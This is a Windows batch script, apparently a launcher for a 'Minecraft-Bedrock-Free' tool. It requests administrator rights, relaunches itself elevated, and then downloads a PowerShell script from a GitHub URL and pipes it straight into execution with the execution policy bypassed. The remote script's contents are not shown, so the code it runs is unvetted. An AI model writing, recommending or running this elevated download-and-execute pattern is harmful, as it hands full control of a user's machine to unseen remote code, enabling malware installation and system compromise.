```bat
@echo off
title Eypz X CoelhoFZ
color 0B

:: Request Administrator permissions
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cls
echo.
echo  ====================================
echo          Eypz X CoelhoFZ
echo  ====================================
echo.
echo  Credit: Eypz X CoelhoFZ
echo.
echo  Starting PowerShell script...
echo.

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://github.com/CoelhoFZ/Minecraft-Bedrock-Free/raw/main/i.ps1' | iex"

echo.
echo  Script execution finished.
pause
```